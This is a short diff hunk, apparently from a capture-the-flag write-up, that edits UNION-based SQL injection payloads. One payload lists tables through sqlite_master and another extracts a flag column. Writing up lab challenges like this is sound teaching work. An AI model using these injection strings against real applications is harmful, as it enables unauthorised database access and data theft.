@@ -8,4 +8,4 @@ Now we can just list all tables with this query:</br>
 ' UNION SELECT name, sql, null from sqlite_master;--</br></br>
 
 We can now get the flag using:</br>
-123' UNION SELECT flag, null, null from more_table;--
+' UNION SELECT flag, null, null from more_table;--
